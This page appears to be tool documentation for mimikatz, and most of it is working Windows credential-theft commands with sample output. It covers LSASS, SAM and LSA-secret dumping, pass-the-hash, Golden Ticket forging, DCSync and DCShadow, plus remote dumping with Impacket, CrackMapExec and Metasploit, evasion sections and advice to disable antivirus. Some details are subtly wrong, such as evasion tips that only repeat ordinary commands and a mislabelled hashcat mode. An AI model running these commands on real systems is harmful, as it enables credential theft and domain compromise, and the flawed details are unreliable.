---
title: "mimikatz - Windows Credential Dumping Tool"
authors:
  - "Kali Linux Documentation"
date: "2026-07-18"
categories:
  - "Credential Dumping"
  - "Credential Access"
  - "Windows Security"
tags:
  - "mimikatz"
  - "credential-dumping"
  - "windows"
  - "pass-the-hash"
  - "kerberos"
  - "golden-ticket"
mitre_tactic: credential_access
mitre_tactic_id: TA0006
mitre_technique: Credential Dumping
mitre_technique_id: T1003
version: "2.2.0"
tool_url: "https://github.com/gentilkiwi/mimikatz"
kali_url: "https://www.kali.org/tools/mimikatz/"
license: "CC-BY-4.0"
---

# mimikatz - Windows Credential Dumping Tool

## Overview

**mimikatz** is a Windows credential dumping tool created by Benjamin Delpy (gentilkiwi). It is widely known for extracting plaintexts passwords, hashes, PIN codes, and Kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket, and build Golden tickets, making it one of the most powerful credential theft tools available.

**Key Features**:
- **Plaintext password extraction** - Extract passwords from LSASS memory
- **Hash extraction** - LM, NTLM, and Kerberos hashes
- **Kerberos attacks** - Golden/Silver tickets, pass-the-ticket
- **Pass-the-hash** - Use NTLM hashes without knowing passwords
- **Certificate extraction** - Export certificates and private keys
- **Vault access** - Extract Windows Vault credentials
- **LSA secrets** - Dump LSA secrets and cached credentials

**Supported Operations**:
- **sekurlsa** - Extract credentials from LSASS memory
- **kerberos** - Kerberos ticket operations
- **lsadump** - LSA secrets and SAM database
- **crypto** - Certificate and key operations
- **vault** - Windows Vault credentials
- **token** - Token manipulation
- **dpapi** - Data Protection API operations

## Installation

### Windows Binary

```powershell
# Download from GitHub releases
# https://github.com/gentilkiwi/mimikatz/releases

# Extract and run
mimikatz.exe
```

### Kali Linux (for remote attacks)

```bash
# Install impacket for remote credential dumping
pip3 install impacket

# Use secretsdump.py for remote dumping
secretsdump.py -h
```

### From Source (Windows)

```bash
# Requires Visual Studio 2010/2012/2013
# Clone repository
git clone https://github.com/gentilkiwi/mimikatz.git

# Open mimikatz.sln in Visual Studio
# Build solution
```

## Command Reference

### Core Modules

| Module | Description |
|--------|-------------|
| `sekurlsa` | Extract credentials from LSASS memory |
| `kerberos` | Kerberos ticket operations |
| `lsadump` | LSA secrets and SAM database |
| `crypto` | Certificate and key operations |
| `vault` | Windows Vault credentials |
| `token` | Token manipulation |
| `dpapi` | Data Protection API operations |
| `privilege` | Privilege management |

### Common Commands

```bash
# Enable debug privilege
privilege::debug

# Extract logon passwords
sekurlsa::logonpasswords

# Extract Kerberos tickets
sekurlsa::tickets /export

# Pass-the-hash
sekurlsa::pth /user:admin /domain:CORP /ntlm:hash /run:cmd

# Golden ticket
kerberos::golden /admin:admin /domain:CORP /sid:S-1-5-21-... /krbtgt:hash /ticket:golden.kirbi

# Dump SAM
lsadump::sam

# Dump LSA secrets
lsadump::secrets

# Dump cached credentials
lsadump::cache

# Export certificates
crypto::certificates /export

# Export private keys
crypto::keys /export
```

## Usage Examples

### Extract Logon Passwords

**Basic Extraction**:
```powershell
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
```

**Output Example**:
```
Authentication Id : 0 ; 515764 (00000000:0007deb4)
Session           : Interactive from 2
User Name         : John
Domain            : WORKGROUP
SID               : S-1-5-21-1982681256-1210654043-1600862990-1000
        msv :
         [00000003] Primary
         * Username : John
         * Domain   : WORKGROUP
         * LM       : d0e9aee149655a6075e4540af1f22d3b
         * NTLM     : cc36cf7a8514893efccd332446158b1a
         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30
        tspkg :
         * Username : John
         * Domain   : WORKGROUP
         * Password : Password123
```

### Extract Kerberos Tickets

**Export All Tickets**:
```powershell
mimikatz # sekurlsa::tickets /export
```

**Output**:
```
Authentication Id : 0 ; 515764 (00000000:0007deb4)
Session           : Interactive from 2
User Name         : John
Domain            : CORP
SID               : S-1-5-21-1982681256-1210654043-1600862990-1000

         * Username : John
         * Domain   : CORP
         * Password : Password123

         [00000003] Primary
         * Kerberos NewSession (12)
         * Key      : 0x53515173745849654b4c4e504d414243
```

### Pass-the-Hash

**Execute Command with Hash**:
```powershell
mimikatz # sekurlsa::pth /user:administrator /domain:CORP /ntlm:cc36cf7a8514893efccd332446158b1a /run:cmd.exe
```

**Access Network Share**:
```powershell
mimikatz # sekurlsa::pth /user:administrator /domain:CORP /ntlm:cc36cf7a8514893efccd332446158b1a /run:explorer.exe
```

### Golden Ticket

**Create Golden Ticket**:
```powershell
mimikatz # kerberos::golden /admin:administrator /domain:CORP /sid:S-1-5-21-1982681256-1210654043-1600862990 /krbtgt:cc36cf7a8514893efccd332446158b1a /ticket:golden.kirbi
```

**Use Golden Ticket**:
```powershell
mimikatz # kerberos::ptt golden.kirbi
```

### Dump SAM Database

**Dump Local SAM**:
```powershell
mimikatz # lsadump::sam
```

**Output Example**:
```
SAM
--
RID  : 000001f4 (500)
User : Administrator
LM   : d0e9aee149655a6075e4540af1f22d3b
NTLM : cc36cf7a8514893efccd332446158b1a

RID  : 000003e8 (1000)
User : John
LM   : d0e9aee149655a6075e4540af1f22d3b
NTLM : cc36cf7a8514893efccd332446158b1a
```

### Dump LSA Secrets

**Extract LSA Secrets**:
```powershell
mimikatz # lsadump::secrets
```

**Output Example**:
```
LSA Secrets
-----------
DefaultPassword
: testpass

NL$KM
: 8c9e150000000000000000000000000000000000000000000000000000000000
```

### Dump Cached Credentials

**Extract Cached Credentials**:
```powershell
mimikatz # lsadump::cache
```

**Output Example**:
```
Domain Cache (DSC)
------------------
nharpsis
:6b29dfa157face3f3d8db489aec5cc12:acme:acme.local
```

### Export Certificates

**Export All Certificates**:
```powershell
mimikatz # crypto::certificates /export
```

**Export from Local Machine Store**:
```powershell
mimikatz # crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
```

### Export Private Keys

**Export All Private Keys**:
```powershell
mimikatz # crypto::keys /export
```

**Export Machine Keys**:
```powershell
mimikatz # crypto::keys /machine /export
```

### Token Manipulation

**Elevate to SYSTEM**:
```powershell
mimikatz # token::elevate
```

**Revert to Original Token**:
```powershell
mimikatz # token::revert
```

### DCSync Attack

**Extract Kerberos Ticket Granting Ticket (KRBTGT)**:
```powershell
mimikatz # lsadump::dcsync /user:domain\krbtgt /domain:lab.local
```

**Extract Specific User Hash**:
```powershell
mimikatz # lsadump::dcsync /user:domain\administrator /domain:lab.local
```

### DCShadow Attack

**Register Rogue Domain Controller**:
```powershell
mimikatz # lsadump::dcshadow /object:targetuser /attribute:unicodePwd /value:01000000...
```

### Complete Credential Dump

**Extract All Credentials**:
```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets /export
mimikatz # lsadump::sam
mimikatz # lsadump::secrets
mimikatz # lsadump::cache
mimikatz # crypto::certificates /export
mimikatz # crypto::keys /export
```

### Remote Credential Dumping

**Using Impacket (Linux)**:
```bash
# Dump SAM hashes remotely
secretsdump.py administrator:password123@192.168.1.100

# Dump SAM hashes with NTLM hash
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:cc36cf7a8514893efccd332446158b1a administrator@192.168.1.100

# Dump DCSync
secretsdump.py -just-dc-ntlm CORP/administrator:password123@dc01.corp.local
```

**Using CrackMapExec (Linux)**:
```bash
# Dump SAM hashes
crackmapexec smb 192.168.1.100 -u administrator -p password123 --sam

# Dump LSA secrets
crackmapexec smb 192.168.1.100 -u administrator -p password123 --lsa

# DCSync
crackmapexec smb dc01.corp.local -u administrator -p password123 --ntds
```

## Output Interpretation

### Logon Passwords Output

```
Authentication Id : 0 ; 515764 (00000000:0007deb4)
Session           : Interactive from 2
User Name         : John
Domain            : WORKGROUP
SID               : S-1-5-21-1982681256-1210654043-1600862990-1000
        msv :
         [00000003] Primary
         * Username : John
         * Domain   : WORKGROUP
         * LM       : d0e9aee149655a6075e4540af1f22d3b
         * NTLM     : cc36cf7a8514893efccd332446158b1a
         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30
        tspkg :
         * Username : John
         * Domain   : WORKGROUP
         * Password : Password123
```

**Fields**:
- **Authentication Id**: Logon session ID
- **Session**: Logon type (Interactive, Network, etc.)
- **User Name**: Account name
- **Domain**: Domain or computer name
- **SID**: Security Identifier
- **msv**: MSV1_0 authentication package
- **tspkg**: TsPkg authentication package (plaintext password)

### SAM Dump Output

```
SAM
--
RID  : 000001f4 (500)
User : Administrator
LM   : d0e9aee149655a6075e4540af1f22d3b
NTLM : cc36cf7a8514893efccd332446158b1a
```

**Fields**:
- **RID**: Relative Identifier (user ID)
- **User**: Account name
- **LM**: LAN Manager hash
- **NTLM**: NT LAN Manager hash

## Integration with Other Tools

### Impacket Integration

```bash
# Remote SAM dump
secretsdump.py administrator:password123@192.168.1.100

# Remote DCSync
secretsdump.py -just-dc-ntlm CORP/administrator:password123@dc01.corp.local

# Pass-the-hash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:cc36cf7a8514893efccd332446158b1a administrator@192.168.1.100
```

### CrackMapExec Integration

```bash
# Dump SAM
crackmapexec smb 192.168.1.100 -u administrator -p password123 --sam

# Dump LSA
crackmapexec smb 192.168.1.100 -u administrator -p password123 --lsa

# DCSync
crackmapexec smb dc01.corp.local -u administrator -p password123 --ntds
```

### Hashcat Integration

```bash
# Crack NTLM hashes
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Crack Kerberos TGT
hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt
```

### Metasploit Integration

```bash
# Use found credentials
msfconsole -q -x "use exploit/windows/smb/psexec; set RHOSTS 192.168.1.100; set SMBUser administrator; set SMBPass password123; exploit"
```

## Operational Security

### Evasion Techniques

```powershell
# Run from memory (fileless)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Use alternative tools
mimikatz # sekurlsa::pth /user:admin /domain:CORP /ntlm:hash /run:cmd.exe
```

### Detection Avoidance

```powershell
# Use mimikatz modules directly
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Export to file
mimikatz # sekurlsa::logonpasswords > output.txt
```

## Common Issues and Troubleshooting

### Issue: "Privilege not enabled"

**Cause**: mimikatz not running as administrator.

**Solution**:
```powershell
# Run as administrator
mimikatz # privilege::debug
Privilege '20' OK
```

### Issue: "LSASS protection enabled"

**Cause**: Credential Guard or LSA protection enabled.

**Solution**:
```powershell
# Try alternative methods
mimikatz # sekurlsa::logonpasswords

# Or use DCSync
mimikatz # lsadump::dcsync /user:domain\krbtgt /domain:lab.local
```

### Issue: "No credentials found"

**Cause**: LSASS memory protected or no logon sessions.

**Solution**:
```powershell
# Ensure debug privilege
mimikatz # privilege::debug

# Try alternative extraction
mimikatz # sekurlsa::tickets /export
```

### Issue: "Access denied"

**Cause**: Insufficient privileges or antivirus blocking.

**Solution**:
```powershell
# Run as administrator
# Disable antivirus temporarily
# Use alternative tools (Impacket, CrackMapExec)
```

## Best Practices

### Complete Credential Dump

```powershell
# 1. Enable debug privilege
mimikatz # privilege::debug

# 2. Extract logon passwords
mimikatz # sekurlsa::logonpasswords

# 3. Extract Kerberos tickets
mimikatz # sekurlsa::tickets /export

# 4. Dump SAM database
mimikatz # lsadump::sam

# 5. Dump LSA secrets
mimikatz # lsadump::secrets

# 6. Dump cached credentials
mimikatz # lsadump::cache

# 7. Export certificates
mimikatz # crypto::certificates /export
```

### Remote Credential Dump

```bash
# Using Impacket
secretsdump.py administrator:password123@192.168.1.100

# Using CrackMapExec
crackmapexec smb 192.168.1.100 -u administrator -p password123 --sam
```

## Resources

- **GitHub Repository**: https://github.com/gentilkiwi/mimikatz
- **Blog**: https://blog.gentilkiwi.com/mimikatz
- **Wiki**: https://github.com/gentilkiwi/mimikatz/wiki
- **License**: CC-BY-4.0

## Related Tools

- **creddump7**: Python tool for extracting credentials from Windows registry hives
- **chntpw**: Windows password hash editor
- **samdump2**: Extract password hashes from Windows SAM database
- **Responder**: LLMNR/NBT-NS/MDNS poisoner for credential capture
- **Impacket**: Python toolkit for network protocol attacks
- **CrackMapExec**: Network penetration testing tool
